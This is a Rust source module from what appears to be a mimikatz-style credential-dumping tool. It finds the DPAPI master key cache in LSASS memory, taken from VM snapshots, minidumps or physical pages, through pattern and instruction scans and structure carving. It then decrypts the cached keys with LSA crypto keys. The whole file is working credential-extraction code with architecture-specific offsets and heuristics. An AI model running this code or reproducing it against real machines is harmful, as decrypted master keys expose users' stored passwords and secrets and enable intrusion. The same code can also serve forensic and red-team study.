use crate::error::Result;
use crate::lsass::crypto::{self, CryptoKeys};
use crate::lsass::patterns;
use crate::lsass::types::{Arch, DpapiCredential, read_ptr, is_valid_user_ptr, walk_list, read_ptr_from_buf, scan_data_for_list_head};
use crate::memory::{PhysicalMemory, VirtualMemory};
use crate::paging::translate::{PageTableWalker, PaePageTableWalker};
use crate::pe::parser::PeHeaders;

/// Per-arch offsets for KIWI_MASTERKEY_CACHE_ENTRY.
struct DpapiOffsets {
    luid: u64,
    guid: u64,
    key_size: u64,
    key_data: u64,
}

const DPAPI_OFFSETS_X64: DpapiOffsets = DpapiOffsets {
    luid: 0x10,
    guid: 0x18,
    key_size: 0x30,
    key_data: 0x34,
};

const DPAPI_OFFSETS_X86: DpapiOffsets = DpapiOffsets {
    luid: 0x08,
    guid: 0x10,
    key_size: 0x28,
    key_data: 0x2C,
};

/// Extract DPAPI master key cache entries from lsasrv.dll (unified x64/x86).
///
/// Keys are stored encrypted with LsaProtectMemory (3DES/AES) and must be decrypted.
///
/// Resolution strategy (three fallback levels):
///   1. .text pattern scan + LEA/abs address resolution
///   2. LEA-to-data scan (x64) or abs-to-data scan (x86) over all .text instructions
///   3. .data section heuristic scan for LIST_ENTRY heads
pub fn extract_dpapi_credentials_arch(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let offsets = match arch {
        Arch::X64 => &DPAPI_OFFSETS_X64,
        Arch::X86 => &DPAPI_OFFSETS_X86,
    };

    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    // Select arch-appropriate patterns
    let pattern_list = match arch {
        Arch::X64 => patterns::DPAPI_MASTER_KEY_PATTERNS,
        Arch::X86 => patterns::DPAPI_MASTER_KEY_PATTERNS_X86,
    };

    // Try .text pattern scan first, then LEA/abs-to-data scan, then .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = lsasrv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                pattern_list,
                "g_MasterKeyCacheList",
            ) {
                Ok((pattern_addr, _)) => {
                    resolve_list_addr(vmem, &pe, lsasrv_base, pattern_addr, arch)?
                }
                Err(e) => {
                    log::debug!(
                        "DPAPI .text pattern scan failed ({}), trying instruction scan",
                        e
                    );
                    match find_dpapi_list_via_insn_scan(vmem, &pe, lsasrv_base, offsets, arch) {
                        Ok(addr) => addr,
                        Err(e2) => {
                            log::debug!(
                                "DPAPI instruction scan failed ({}), trying .data fallback",
                                e2
                            );
                            find_dpapi_list_in_data(vmem, &pe, lsasrv_base, offsets, arch)?
                        }
                    }
                }
            }
        }
        None => find_dpapi_list_in_data(vmem, &pe, lsasrv_base, offsets, arch)?,
    };

    log::info!("DPAPI g_MasterKeyCacheList at 0x{:x} (arch={:?})", list_addr, arch);
    walk_masterkey_list(vmem, list_addr, keys, offsets, arch)
}

/// Resolve the list address from a pattern match, using arch-appropriate instruction decoding.
fn resolve_list_addr(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
    pattern_addr: u64,
    arch: Arch,
) -> Result<u64> {
    match arch {
        Arch::X64 => patterns::find_list_via_lea(vmem, pattern_addr, "g_MasterKeyCacheList"),
        Arch::X86 => {
            let ds = pe.find_section(".data").ok_or_else(|| {
                crate::error::VmkatzError::PatternNotFound(".data section in lsasrv.dll".to_string())
            })?;
            let data_base = dll_base + ds.virtual_address as u64;
            let data_end = data_base + ds.virtual_size as u64;
            patterns::find_list_via_abs(vmem, pattern_addr, dll_base, data_base, data_end, "dpapi")
        }
    }
}

/// Walk the g_MasterKeyCacheList linked list and extract entries.
fn walk_masterkey_list(
    vmem: &dyn VirtualMemory,
    list_addr: u64,
    keys: &CryptoKeys,
    offsets: &DpapiOffsets,
    arch: Arch,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let mut results = Vec::new();

    walk_list(vmem, list_addr, arch, |current| {
        if let Some(cred) = read_and_decrypt_entry(vmem, current, keys, offsets) {
            results.push(cred);
        }
        true
    })?;

    log::info!("DPAPI: found {} master key cache entries", results.len());
    Ok(results)
}

/// Read a single DPAPI cache entry and decrypt its key.
fn read_and_decrypt_entry(
    vmem: &dyn VirtualMemory,
    entry_addr: u64,
    keys: &CryptoKeys,
    offsets: &DpapiOffsets,
) -> Option<(u64, DpapiCredential)> {
    let luid = vmem.read_virt_u64(entry_addr + offsets.luid).ok()?;
    let key_size = vmem.read_virt_u32(entry_addr + offsets.key_size).ok()?;
    if key_size == 0 || key_size > 256 {
        return None;
    }

    let guid_bytes = vmem.read_virt_bytes(entry_addr + offsets.guid, 16).ok()?;
    if guid_bytes.iter().all(|&b| b == 0) {
        return None;
    }
    let guid = format_guid(&guid_bytes);

    let enc_key = vmem
        .read_virt_bytes(entry_addr + offsets.key_data, key_size as usize)
        .ok()?;

    // Decrypt with 3DES/AES (same as all other credential providers)
    let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
        Ok(k) => k,
        Err(e) => {
            log::debug!("DPAPI: failed to decrypt key for GUID={}: {}", guid, e);
            return None;
        }
    };

    let sha1 = sha1_digest(&dec_key);
    log::debug!(
        "DPAPI: LUID=0x{:x} GUID={} key_size={}",
        luid,
        guid,
        key_size
    );
    Some((
        luid,
        DpapiCredential {
            guid,
            key: dec_key,
            sha1_masterkey: sha1,
        },
    ))
}

/// Scan lsasrv.dll .text for instructions referencing .data addresses,
/// then validate each target as a potential g_MasterKeyCacheList.
///
/// x64: scans for RIP-relative LEA instructions (REX.W + 8D modrm disp32).
/// x86: scans for absolute address references (LEA/MOV/PUSH with abs32).
fn find_dpapi_list_via_insn_scan(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
    offsets: &DpapiOffsets,
    arch: Arch,
) -> Result<u64> {
    let text = pe.find_section(".text").ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(".text section in lsasrv.dll".to_string())
    })?;
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(".data section in lsasrv.dll".to_string())
    })?;

    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size as usize;
    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_end = data_base + data_sec.virtual_size as u64;

    let chunk_size = 0x10000usize;
    let mut candidates = Vec::new();

    for chunk_off in (0..text_size).step_by(chunk_size) {
        let read_size = std::cmp::min(chunk_size + 16, text_size - chunk_off);
        let chunk = match vmem.read_virt_bytes(text_base + chunk_off as u64, read_size) {
            Ok(d) => d,
            Err(_) => continue,
        };

        match arch {
            Arch::X64 => {
                // Scan for RIP-relative LEA: REX.W(48/4C) 8D modrm(xx05) disp32
                for i in 0..chunk.len().saturating_sub(7) {
                    let rex = chunk[i];
                    if rex != 0x48 && rex != 0x4C {
                        continue;
                    }
                    if chunk[i + 1] != 0x8D {
                        continue;
                    }
                    let modrm = chunk[i + 2];
                    if modrm & 0xC7 != 0x05 {
                        continue;
                    }
                    let disp = i32::from_le_bytes([
                        chunk[i + 3],
                        chunk[i + 4],
                        chunk[i + 5],
                        chunk[i + 6],
                    ]);
                    let rip = text_base + (chunk_off + i) as u64 + 7;
                    let target = (rip as i64 + disp as i64) as u64;
                    if target >= data_base && target < data_end {
                        candidates.push(target);
                    }
                }
            }
            Arch::X86 => {
                // Scan for abs32 references: LEA reg,[abs32], MOV EAX,[abs32], PUSH abs32
                for i in 0..chunk.len().saturating_sub(6) {
                    let (is_abs, abs_off) = match chunk[i] {
                        0x8D | 0x8B if i + 1 < chunk.len() && (chunk[i + 1] & 0xC7) == 0x05 => {
                            (true, i + 2)
                        }
                        0x68 | 0xA1 | 0xA3 => (true, i + 1),
                        _ => (false, 0),
                    };
                    if !is_abs || abs_off + 4 > chunk.len() {
                        continue;
                    }
                    let target = u32::from_le_bytes([
                        chunk[abs_off],
                        chunk[abs_off + 1],
                        chunk[abs_off + 2],
                        chunk[abs_off + 3],
                    ]) as u64;
                    if target >= data_base && target < data_end {
                        candidates.push(target);
                    }
                }
            }
        }
    }

    candidates.sort_unstable();
    candidates.dedup();
    log::debug!(
        "DPAPI instruction scan: {} unique .data targets found (arch={:?})",
        candidates.len(),
        arch,
    );

    for target in &candidates {
        if validate_dpapi_list_head(vmem, *target, lsasrv_base, offsets, arch) {
            log::info!(
                "DPAPI instruction scan: found g_MasterKeyCacheList at 0x{:x}",
                target
            );
            return Ok(*target);
        }
    }

    Err(crate::error::VmkatzError::PatternNotFound(
        "g_MasterKeyCacheList via instruction scan".to_string(),
    ))
}

/// Fallback: scan lsasrv.dll .data section for g_MasterKeyCacheList LIST_ENTRY head.
fn find_dpapi_list_in_data(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
    offsets: &DpapiOffsets,
    arch: Arch,
) -> Result<u64> {
    scan_data_for_list_head(
        vmem, pe, lsasrv_base, arch, 0x20000, "lsasrv.dll", 0x200000,
        false, "g_MasterKeyCacheList",
        |_flink, list_addr| {
            if validate_dpapi_list_head(vmem, list_addr, lsasrv_base, offsets, arch) {
                log::debug!("DPAPI: found g_MasterKeyCacheList at 0x{:x}", list_addr);
                return true;
            }
            false
        },
    )
}

/// Validate a candidate LIST_ENTRY head as g_MasterKeyCacheList.
fn validate_dpapi_list_head(
    vmem: &dyn VirtualMemory,
    head: u64,
    lsasrv_base: u64,
    offsets: &DpapiOffsets,
    arch: Arch,
) -> bool {
    let flink = match read_ptr(vmem, head, arch) {
        Ok(f) => f,
        Err(_) => return false,
    };
    if !is_valid_user_ptr(flink, arch) || flink == head {
        return false;
    }
    // Entry flink should NOT point back into lsasrv.dll itself
    if flink >= lsasrv_base && flink < lsasrv_base + 0x200000 {
        return false;
    }
    // Entry's Blink should point back to head
    let entry_blink = match read_ptr(vmem, flink + arch.ptr_size(), arch) {
        Ok(b) => b,
        Err(_) => return false,
    };
    if entry_blink != head {
        return false;
    }
    // LUID should be reasonable (fits in 32 bits)
    let luid = match vmem.read_virt_u64(flink + offsets.luid) {
        Ok(l) => l,
        Err(_) => return false,
    };
    if luid > 0xFFFF_FFFF {
        return false;
    }
    // key_size should be 32, 48, or 64
    let key_size = match vmem.read_virt_u32(flink + offsets.key_size) {
        Ok(k) => k,
        Err(_) => return false,
    };
    if !matches!(key_size, 32 | 48 | 64) {
        return false;
    }
    // GUID should not be all zeros
    let guid_bytes = match vmem.read_virt_bytes(flink + offsets.guid, 16) {
        Ok(g) => g,
        Err(_) => return false,
    };
    if guid_bytes.iter().all(|&b| b == 0) {
        return false;
    }
    let d1 = u32::from_le_bytes([guid_bytes[0], guid_bytes[1], guid_bytes[2], guid_bytes[3]]);
    d1 != 0
}

/// Physical scan for DPAPI master key cache entries in LSASS pages.
///
/// When pattern-based scanning fails (lsasrv.dll .data paged out), directly
/// scan LSASS physical pages for KIWI_MASTERKEY_CACHE_ENTRY structures.
///
/// Note: physical scan uses hardcoded x64 offsets because it runs only on
/// VM snapshot paths where x64 is guaranteed.
///
/// Structure (all x64 Windows):
///   +0x00: Flink (heap ptr)
///   +0x08: Blink (heap ptr or .data addr)
///   +0x10: LUID (u64, < 0xFFFFFFFF)
///   +0x18: GUID (16 bytes, non-zero)
///   +0x28: insertTime (FILETIME)
///   +0x30: keySize (u32: 32, 48, or 64)
///   +0x34: key[] (encrypted, keySize bytes)
pub fn extract_dpapi_physical_scan<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &dyn VirtualMemory,
    keys: &CryptoKeys,
) -> Vec<(u64, DpapiCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates: Vec<u64> = Vec::new();

    log::info!("DPAPI physical scan: searching LSASS pages for master key cache entries...");

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };
        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Entry needs: 0x34 (key offset) + 64 (max key) = 0x74 bytes
        for off in (0..0x1000usize.saturating_sub(0x74)).step_by(8) {
            if try_dpapi_entry_match(&page_data, off) {
                candidates.push(mapping.vaddr + off as u64);
            }
        }
    });

    log::info!(
        "DPAPI physical scan: {} pages scanned, {} candidates",
        pages_scanned,
        candidates.len()
    );

    let offsets = &DPAPI_OFFSETS_X64;
    let mut seen_guids = std::collections::HashSet::new();

    for vaddr in &candidates {
        let luid = vmem.read_virt_u64(*vaddr + offsets.luid).unwrap_or(0);
        if luid == 0 || luid > 0xFFFF_FFFF {
            continue;
        }
        let key_size = vmem.read_virt_u32(*vaddr + offsets.key_size).unwrap_or(0);
        if !matches!(key_size, 32 | 48 | 64) {
            continue;
        }
        let guid_bytes = match vmem.read_virt_bytes(*vaddr + offsets.guid, 16) {
            Ok(g) => g,
            Err(_) => continue,
        };
        if guid_bytes.iter().all(|&b| b == 0) {
            continue;
        }
        // Validate GUID doesn't look like ASCII text (false positive filter)
        if guid_bytes
            .iter()
            .all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ')
        {
            continue;
        }
        let guid = format_guid(&guid_bytes);
        if !seen_guids.insert(guid.clone()) {
            continue;
        }

        let enc_key = match vmem.read_virt_bytes(*vaddr + offsets.key_data, key_size as usize) {
            Ok(k) => k,
            Err(_) => continue,
        };
        // Encrypted key should not be all zeros
        if enc_key.iter().all(|&b| b == 0) {
            continue;
        }

        // Decrypt with 3DES/AES
        let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
            Ok(k) => k,
            Err(_) => continue,
        };

        let sha1 = sha1_digest(&dec_key);
        log::info!(
            "DPAPI phys-scan: LUID=0x{:x} GUID={} key_size={}",
            luid,
            guid,
            key_size
        );
        results.push((
            luid,
            DpapiCredential {
                guid,
                key: dec_key,
                sha1_masterkey: sha1,
            },
        ));
    }

    log::info!("DPAPI physical scan: {} entries extracted", results.len());
    results
}

/// Extract DPAPI master keys from x86 LSASS by scanning PAE page tables.
///
/// Enumerates present user-mode pages via PAE page table walk, then runs the
/// arch-aware vmem scan on each page.
pub fn extract_dpapi_physical_scan_x86<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &dyn VirtualMemory,
    keys: &CryptoKeys,
) -> Vec<(u64, DpapiCredential)> {
    let walker = PaePageTableWalker::new(phys);
    let mut regions: Vec<(u64, u64)> = Vec::new();

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size == 0x1000 {
            regions.push((mapping.vaddr, mapping.size));
        }
    });

    log::info!(
        "DPAPI x86 physical scan: {} present pages, running vmem scan...",
        regions.len()
    );

    extract_dpapi_vmem_scan(vmem, &regions, keys, Arch::X86)
}

/// Extract DPAPI master keys by scanning virtual memory regions (minidump fallback).
///
/// Equivalent of `extract_dpapi_physical_scan` but for minidumps where we don't have
/// PhysicalMemory. Scans all provided region ranges for DPAPI entry signatures.
pub fn extract_dpapi_vmem_scan(
    vmem: &dyn VirtualMemory,
    region_ranges: &[(u64, u64)],
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, DpapiCredential)> {
    let offsets = match arch {
        Arch::X64 => &DPAPI_OFFSETS_X64,
        Arch::X86 => &DPAPI_OFFSETS_X86,
    };
    let ptr_size = arch.ptr_size() as usize;
    // Minimum entry size: key_data offset + 64 bytes of key
    let min_entry = offsets.key_data as usize + 64;

    let mut results = Vec::new();
    let mut seen_guids = std::collections::HashSet::new();
    let mut total_scanned = 0u64;
    let mut candidates = 0u64;

    for &(base, size) in region_ranges {
        let chunk_size = size as usize;
        if chunk_size < min_entry {
            continue;
        }
        let data = match vmem.read_virt_bytes(base, chunk_size) {
            Ok(d) => d,
            Err(_) => continue,
        };
        total_scanned += size;

        for off in (0..chunk_size.saturating_sub(min_entry)).step_by(ptr_size) {
            // Check pointer-like flink/blink at the start
            let flink = read_ptr_from_buf(&data, off, arch);
            let blink = read_ptr_from_buf(&data, off + ptr_size, arch);
            if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
                continue;
            }

            // LUID
            let luid_off = off + offsets.luid as usize;
            if luid_off + 8 > data.len() { continue; }
            let luid = super::types::read_u64_le(&data, luid_off).unwrap_or(0);
            if luid == 0 || luid > 0xFFFF_FFFF {
                continue;
            }

            // GUID
            let guid_off = off + offsets.guid as usize;
            if guid_off + 16 > data.len() { continue; }
            let guid_bytes = &data[guid_off..guid_off + 16];
            if !validate_dpapi_guid(guid_bytes) {
                continue;
            }

            // key_size
            let ks_off = off + offsets.key_size as usize;
            if ks_off + 4 > data.len() { continue; }
            let key_size = super::types::read_u32_le(&data, ks_off).unwrap_or(0);
            if !matches!(key_size, 32 | 48 | 64) {
                continue;
            }

            candidates += 1;
            let vaddr = base + off as u64;
            let guid = format_guid(guid_bytes);
            if !seen_guids.insert(guid.clone()) {
                continue;
            }

            // Read encrypted key from virtual memory (may cross page boundary)
            let enc_key = match vmem.read_virt_bytes(vaddr + offsets.key_data, key_size as usize) {
                Ok(k) => k,
                Err(_) => continue,
            };
            if enc_key.iter().all(|&b| b == 0) {
                continue;
            }

            let dec_key = match crypto::decrypt_credential(keys, &enc_key) {
                Ok(k) => k,
                Err(_) => continue,
            };

            let sha1 = sha1_digest(&dec_key);
            log::info!(
                "DPAPI vmem-scan: LUID=0x{:x} GUID={} key_size={}",
                luid, guid, key_size
            );
            results.push((
                luid,
                DpapiCredential {
                    guid,
                    key: dec_key,
                    sha1_masterkey: sha1,
                },
            ));
        }
    }

    log::info!(
        "DPAPI vmem scan: scanned {} bytes, {} candidates, {} entries extracted",
        total_scanned, candidates, results.len()
    );
    results
}

/// Check if a page region at `off` matches a DPAPI master key cache entry signature.
///
/// Uses x64 offsets (only called from physical scan / carve mode which are x64-only).
pub(crate) fn try_dpapi_entry_match(page: &[u8], off: usize) -> bool {
    if off + 0x74 > page.len() {
        return false;
    }
    // Flink at +0x00: valid user-mode pointer
    let flink = super::types::read_u64_le(page, off).unwrap_or(0);
    if flink < 0x10000 || (flink >> 48) != 0 {
        return false;
    }
    // Blink at +0x08: valid pointer
    let blink = super::types::read_u64_le(page, off + 8).unwrap_or(0);
    if blink < 0x10000 || (blink >> 48) != 0 {
        return false;
    }
    // LUID at +0x10: reasonable
    let luid = super::types::read_u64_le(page, off + 0x10).unwrap_or(0);
    if luid == 0 || luid > 0xFFFF_FFFF {
        return false;
    }

    if !validate_dpapi_guid(&page[off + 0x18..off + 0x28]) {
        return false;
    }

    // insertTime at +0x28: FILETIME should be a reasonable date (2000-2040)
    // High DWORD of FILETIME for year 2000 ~ 0x01BF..., year 2040 ~ 0x01E0...
    let ft_high = super::types::read_u32_le(page, off + 0x2C).unwrap_or(0);
    if !(0x01BF_0000..=0x01E0_0000).contains(&ft_high) {
        return false;
    }
    // key_size at +0x30: DPAPI master keys are always 64 bytes (SHA-512 derived).
    // In carve mode (physical scan), only accept 64 to reduce false positives.
    // 32/48 values pass structure validation but are invariably false positives.
    let key_size = super::types::read_u32_le(page, off + 0x30).unwrap_or(0);
    if key_size != 64 {
        return false;
    }
    // key data at +0x34: first 16 bytes shouldn't be all zero
    let key_start = &page[off + 0x34..off + 0x34 + 16];
    if key_start.iter().all(|&b| b == 0) {
        return false;
    }
    true
}

/// Validate GUID bytes from a candidate DPAPI entry.
/// Real GUIDs (v4 random) have high entropy and non-zero middle fields.
fn validate_dpapi_guid(guid: &[u8]) -> bool {
    debug_assert!(guid.len() == 16);

    // D1 (first u32) non-zero
    let d1 = u32::from_le_bytes(guid[0..4].try_into().unwrap());
    if d1 == 0 {
        return false;
    }
    // D2+D3 (bytes 4..8) should not both be zero -- real GUIDs have random fields here.
    // Pattern like 00000381-0000-0000-... has D2=0, D3=0 which is not a real GUID.
    let d2 = u16::from_le_bytes(guid[4..6].try_into().unwrap());
    let d3 = u16::from_le_bytes(guid[6..8].try_into().unwrap());
    if d2 == 0 && d3 == 0 {
        return false;
    }
    // Not all ASCII printable (filters text strings mistaken for GUIDs)
    if guid.iter().all(|&b| b.is_ascii_graphic() || b == 0 || b == b' ') {
        return false;
    }
    // Entropy: random GUIDs have >=8 unique bytes out of 16 (v4 has 122 random bits).
    // Structured false positives typically have 5-6 unique bytes.
    if super::crypto::count_unique_bytes(guid) < 8 {
        return false;
    }
    true
}

/// Extract a DPAPI master key entry from raw page bytes at a given offset.
///
/// Used by carve mode to extract DPAPI entries directly from physical pages.
/// All fields are read from page bytes at fixed x64 offsets -- no virtual memory needed.
#[cfg(feature = "carve")]
pub(crate) fn extract_dpapi_from_raw_page(
    page: &[u8],
    off: usize,
    keys: &CryptoKeys,
) -> Option<(u64, DpapiCredential)> {
    if off + 0x74 > page.len() {
        return None;
    }

    let luid = u64::from_le_bytes(page[off + 0x10..off + 0x18].try_into().ok()?);
    if luid == 0 || luid > 0xFFFF_FFFF {
        return None;
    }

    let guid_bytes = &page[off + 0x18..off + 0x28];
    if !validate_dpapi_guid(guid_bytes) {
        return None;
    }
    let guid = format_guid(guid_bytes);

    // key_size must be 64 (DPAPI master keys are SHA-512 derived)
    let key_size =
        u32::from_le_bytes(page[off + 0x30..off + 0x34].try_into().ok()?);
    if key_size != 64 {
        return None;
    }
    if off + 0x34 + 64 > page.len() {
        return None;
    }

    let enc_key = &page[off + 0x34..off + 0x74];
    if enc_key.iter().all(|&b| b == 0) {
        return None;
    }

    let dec_key = crypto::decrypt_credential(keys, enc_key).ok()?;

    // Post-decryption entropy check: real master keys have high entropy.
    // Reject if fewer than 16 unique bytes in 64 bytes (random data has ~55+).
    if super::crypto::count_unique_bytes(&dec_key) < 16 {
        return None;
    }

    let sha1 = sha1_digest(&dec_key);

    Some((
        luid,
        DpapiCredential {
            guid,
            key: dec_key,
            sha1_masterkey: sha1,
        },
    ))
}

/// SHA-1 digest for computing sha1_masterkey.
use crate::utils::sha1_digest;

/// Format a 16-byte GUID as "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
fn format_guid(bytes: &[u8]) -> String {
    if bytes.len() < 16 {
        return hex::encode(bytes);
    }
    let d1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
    let d2 = u16::from_le_bytes([bytes[4], bytes[5]]);
    let d3 = u16::from_le_bytes([bytes[6], bytes[7]]);
    format!(
        "{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        d1,
        d2,
        d3,
        bytes[8],
        bytes[9],
        bytes[10],
        bytes[11],
        bytes[12],
        bytes[13],
        bytes[14],
        bytes[15],
    )
}
